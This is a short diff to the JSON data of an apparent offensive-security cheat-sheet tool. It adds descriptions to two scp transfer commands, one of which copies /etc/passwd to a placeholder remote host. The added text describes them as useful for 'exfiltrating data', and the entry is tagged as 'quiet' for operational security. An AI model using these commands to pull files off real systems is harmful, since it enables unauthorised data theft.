@@ -60,11 +60,13 @@
   "variations": [
     {
       "label": "Download from remote",
-      "command": "scp <user>@<lhost>:/root/myroot.txt ."
+      "command": "scp <user>@<lhost>:/root/myroot.txt .",
+      "description": "Transfers files over SSH using scp. Securely copies files between your attack machine and the target - useful for uploading tools or exfiltrating data."
     },
     {
       "label": "Upload to remote",
-      "command": "scp /etc/passwd <user>@<ip>:/home/<user>/"
+      "command": "scp /etc/passwd <user>@<ip>:/home/<user>/",
+      "description": "Transfers files over SSH using scp. Securely copies files between your attack machine and the target - useful for uploading tools or exfiltrating data."
     }
   ],
   "opsec": "quiet",
